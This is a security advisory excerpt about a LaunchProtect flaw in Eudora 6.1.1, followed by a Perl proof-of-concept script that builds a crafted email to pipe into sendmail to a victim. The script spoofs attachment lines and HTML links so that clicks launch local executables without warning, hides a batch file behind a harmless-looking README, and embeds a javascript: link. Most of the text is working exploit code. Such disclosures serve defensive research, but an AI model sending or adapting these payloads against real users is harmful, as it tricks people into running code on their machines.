source: http://www.securityfocus.com/bid/9101/info
 
A problem has been identified in the implementation of LaunchProtect within Eudora. Because of this, it may be possible to trick users into performing dangerous actions.
 
** May 21, 2004 - Eudora version 6.1.1 has been released, however, it is reported that the new versions is vulnerable to this issue as well. 

#!/usr/bin/perl --

use MIME::Base64;

print "From: me\n";
print "To: you\n";
print "Subject: Eudora 6.1.1 on Windows spoof, LaunchProtect\n";
print "MIME-Version: 1.0\n";
print "Content-Type: multipart/mixed; boundary=\"zzz\"\n";
print "X-Use: Pipe the output of this script into:  sendmail -i victim\n\n";
print "This is a multi-part message in MIME format.\n";
print "--zzz\n";
print "Content-Type: text/plain\n";
print "Content-Transfer-Encoding: 7bit\n";
print "\n";

print "With spoofed attachments, we could 'steal' files if the message
was forwarded (not replied to).\n";

#print "
#(Within plain-text email (or plain-text, inline MIME parts) embedded
#CR=x0d characters used to get converted internally into a NUL=x00 and
#ignored, so we could spoof \"attachment converted\" lines.
#At version 6.1.1, embedded CR seem to get converted into NL=x0a.)\n";

print "\nThe <x-xyz></x-xyz> constructs (x-html, x-rich or x-flowed)
allow spoofing attachments easily.
The following work fine (but put up warnings):\n";
print "<x-html></x-html>Attachment Converted: \"c:\\winnt\\system32\\calc.exe\"\n";
print "<x-html></x-html>Attachment Converted: c:\\winnt\\system32\\calc.exe\n";
print "<x-html></x-html>Attachment Converted: <a href=c:/winnt/system32/calc.exe>file.exe</a>\n";
print "These have broken icons, but execute without warning:\n";
print "<x-html></x-html>Attachment Converted: \"c:\\winnt\\system32\\calc\"\n";
print "<x-html></x-html>Attachment Converted: c:\\winnt\\system32\\calc\n";
print "<x-html></x-html>Attachment Converted: <a href=c:/winnt/system32/calc>file</a>\n";

print "\n<x-html>
With <b>HTML</b> <i>inclusions</i> we can do
<a href=c:/winnt/system32/calc.exe>file.exe</a>
(get warning)
<br>and
<a href=c:/winnt/system32/calc>plain file</a>
(no warning) references.
<br>(Or can do
<a href=\"http://www.maths.usyd.edu.au:8000/u/psz/securepc.html#Eudoraxx\">http</a>
and
<a href=\"javascript:alert(\x27hello\x27)\">javascript</a>
references; the latter
<br>seems to run with IE, regardless of default browser settings.).
</x-html>\n";

print "\n\n<x-rich>
Can also do RTF inclusions. Can that be abused?
</x-rich>\n\n";

print "\n--zzz\n";
print "Content-Type: text/plain; name=\"b64.txt\"\n";
print "Content-Transfer-Encoding: base64\n";
print "Content-Disposition: inline; filename=\"b64.txt\"\n";
print "\n";
$z = "Can no longer spoof attachments in quoted-printable parts, but\r
still can within base64 encoded (plain-text, inline) MIME parts:\r
Attachment Converted: \"c:\\winnt\\system32\\calc.exe\"\r
Attachment Converted: \"c:\\winnt\\system32\\calc\"\r\n";
print encode_base64($z);

print "\n--zzz\n";
print "Content-Type: text/plain\n";
print "Content-Transfer-Encoding: 7bit\n";
print "\n";

$X = 'README'; $Y = "$X.bat";
print "\n\n\nThe X - X.exe dichotomy: send a plain $X attachment:\n";
$z = "rem Funny joke\r\npause\r\n";
print "begin 600 $X\n", pack('u',$z), "`\nend\n";
print "\nand (in another message or after some blurb so is scrolled off in
another screenful) also send $Y. Clicking on $X does not
get it any more, but gets $Y and runs without any warning:\n";
$z = "rem Big joke\r\nrem Should do something nasty\r\npause\r\n";
print "begin 600 $Y\n", pack('u',$z), "`\nend\n";

#print "\nIf we can guess the full path to the attach directory then can
#change the name shown to anything we like, but get broken icon:\n";
#print "<x-html></x-html>Attachment Converted: attach\\README\n";
#print "<x-html></x-html>Attachment Converted: <a href=H:/windows/.eudora/attach/README>file.txt</a>\n";

#print "\nFunny: I thought that since version 6.0, LaunchProtect handled
#the X-X.exe dichotomy (in the attach directory only)...\n";

print "\n";
print "\n--zzz--\n";
print "\n";